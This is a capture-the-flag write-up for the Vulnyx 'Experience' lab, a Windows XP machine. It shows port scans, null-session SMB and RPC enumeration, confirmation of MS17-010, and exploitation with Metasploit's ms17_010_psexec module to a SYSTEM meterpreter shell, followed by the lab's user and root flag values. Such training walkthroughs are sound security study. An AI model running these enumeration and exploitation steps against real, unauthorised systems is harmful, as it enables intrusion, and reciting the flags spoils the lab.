# Vulnyx: Experience

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Low |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `nxc` · `rpcclient` · `msfconsole` |
| **Tags** | `#EternalBlue` `#MS17-010` `#Metasploit` `#LegacyWindows` |
| **URL** | https://vulnyx.com/machines/ |

Another MS17-010/EternalBlue box, this time exploited through Metasploit's `ms17_010_psexec` module instead of a standalone tool. The `C:\Documents and Settings\` path used for the flags — instead of `C:\Users\` — is a giveaway that this build predates Windows Vista, making it an even older target than [Eternal](../eternal/).

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn experience.nyx

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 128
139/tcp open  netbios-ssn  syn-ack ttl 128
445/tcp open  microsoft-ds syn-ack ttl 128
MAC Address: 08:00:27:3E:32:56 (Oracle VirtualBox virtual NIC)
```

Only **135, 139, and 445** are open — an even smaller footprint than the usual Windows spread, consistent with a stripped-down or very old build. A version/script scan fills in the details:

```bash
sudo nmap -p 135,139,445 -sCV experience.nyx

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
MAC Address: 08:00:27:3E:32:56 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-31T16:13:21-07:00
|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:3e:32:56 (Oracle VirtualBox virtual NIC)
|_clock-skew: mean: 13h30m00s, deviation: 4h56m59s, median: 10h00m00s
```

### SMB Enumeration

```bash
nxc smb experience.nyx
SMB         10.0.2.18       445    EXPERIENCE       [*] Windows 5.1 x32 (name:EXPERIENCE) (domain:experience) (signing:False) (SMBv1:True) (Null Auth:True)
```
```bash
nxc smb experience.nyx -u '' -p '' --shares
SMB         10.0.2.18       445    EXPERIENCE       [*] Windows 5.1 x32 (name:EXPERIENCE) (domain:experience) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.0.2.18       445    EXPERIENCE       [+] experience\: 
SMB         10.0.2.18       445    EXPERIENCE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

`rpcclient` connects over a null session and queries the server directly for its identity — often enough on its own to pin down the exact OS build:

```bash
rpcclient -NU "" experience.nyx -c "srvinfo"
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
```

### Confirming MS17-010

```bash
sudo nmap -p 445 --script="smb-vuln*" experience.nyx

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:3E:32:56 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
```

The target is vulnerable to the same MS17-010 flaw as [Eternal](../eternal/).

## Initial Access

### Exploitation via Metasploit

This time the exploit is run through Metasploit's module instead of a standalone tool:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
```

```
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell
```
<img src="../Images/experience/Pasted image 20260531155902.png"/>

`getuid` and `sysinfo` confirm SYSTEM-level access straight from exploitation, the same as with any successful MS17-010 hit — it's a kernel exploit, so there's no lower-privileged intermediate stage.

```cmd
C:\Documents and Settings>dir bill
 Volume in drive C has no label.
 Volume Serial Number is 8842-9464

 Directory of C:\Documents and Settings\bill

01/20/2024  11:38 AM    <DIR>          .
01/20/2024  11:38 AM    <DIR>          ..
01/21/2024  12:41 PM    <DIR>          Desktop
01/20/2024  11:38 AM    <DIR>          Favorites
01/20/2024  11:38 AM    <DIR>          My Documents
01/20/2024  12:33 PM    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   7,831,465,984 bytes free

C:\Documents and Settings>dir bill\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 8842-9464

 Directory of C:\Documents and Settings\bill\Desktop

01/21/2024  12:41 PM    <DIR>          .
01/21/2024  12:41 PM    <DIR>          ..
01/21/2024  12:41 PM                35 root.txt
01/21/2024  12:41 PM                35 user.txt
               2 File(s)             70 bytes
               2 Dir(s)   7,831,465,984 bytes free

C:\Documents and Settings>type bill\Desktop\user.txt
f9e24c8da0686680decee9e594178a2e

C:\Documents and Settings>type bill\Desktop\root.txt
c1d5e7e4efece4a6022c4a4080c8114d
```

> **User flag:** `f9e24c8da0686680decee9e594178a2e`
> **Root flag:** `c1d5e7e4efece4a6022c4a4080c8114d`

## Takeaways

- `C:\Documents and Settings\` versus `C:\Users\` is a quick, reliable way to date a Windows filesystem — the former was replaced starting with Vista, so its presence alone narrows the target down significantly.
- The same vulnerability can have multiple usable exploits with different trade-offs — a standalone script (like the one used on Eternal) versus a Metasploit module, both landing the same outcome through different tooling.
- A null RPC session (`rpcclient -NU ""`) is worth trying on any SMB target before assuming credentials are required — plenty of legacy and misconfigured hosts still answer basic identity queries to anyone.